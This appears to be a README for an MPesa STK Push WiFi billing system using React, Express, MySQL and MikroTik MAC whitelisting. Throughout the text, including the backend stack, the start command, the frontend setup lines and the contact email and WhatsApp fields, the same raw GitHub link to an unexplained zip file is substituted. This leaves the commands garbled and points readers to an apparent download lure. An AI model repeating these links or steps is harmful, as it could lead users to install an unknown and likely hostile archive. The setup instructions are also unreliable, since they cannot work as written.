
# Mpesa_Based-WiFi-Billing-System
A WiFi billing system that allows users to purchase internet access via MPesa payments (STK Push). Ideal for cybercafés, small businesses, and public WiFi hotspots.

**📌 FEATURES**

✅ MPesa STK Push Integration – Users pay directly from their phone via STK Push.

✅ Time-Based Access.

✅ Admin Dashboard – Track payments and manage users.

✅ MAC Address Whitelisting – Secure WiFi access via MikroTik integration.


**🛠️ TECH STACK**

Frontend: React + Tailwind CSS

Backend: https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip + Express

Database: MySQL

Router Integration: MikroTik (MAC Address Whitelisting)


**🔧 INSTALLATION & SETUP**

1️⃣ Clone the Repository


`cd Mpesa_Based-WiFi-Billing-System`



2️⃣ Install Dependencies


`npm install`



3️⃣ Set Up Environment Variables


```
MPESA_CONSUMER_KEY=your_key
MPESA_CONSUMER_SECRET=your_secret
MPESA_PASSKEY=your_passkey
MPESA_SHORTCODE=your_shortcode
DATABASE_URL=mysql://user:password@localhost/dbname
```



4️⃣ Run the Application


### Start the backend
`node https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip`

### Start the frontend
From the `Frontend/` folder:
```
cp https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip # if provided, otherwise create manually
echo NEXT_PUBLIC_API_URL=http://localhost:5000 > https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip
npm install
npm run dev
```

# 🚀 RECENT IMPROVEMENTS (2025)

**Authentication & Security**
- Refactored backend authentication to use Prisma ORM and secure password hashing (bcrypt).
- Implemented robust admin login with JWT-based session management.
- Added error handling and secure credential validation for all login flows.

**Frontend Enhancements**
- Redesigned admin login page with improved error feedback and user experience.
- Dashboard now displays logged-in admin info and provides a logout button.
- Added reusable authentication hook and protected route wrapper for admin-only pages.

**Codebase & Runtime**
- All components now use proper default/named exports and pass runtime checks.
- Modularized authentication logic for maintainability and scalability.
- Improved error handling and feedback throughout the stack.

*I feel like this is the last part for this project, will nolonger be managing it.*


*🤝 CONTRIBUTING*

Feel free to submit issues and pull requests to improve the system!



## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.






***📞 CONTACT***

For inquiries & support, reach out via: 

*(Paid Consultations)* only

📧 Email: https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip

📱 WhatsApp: https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip
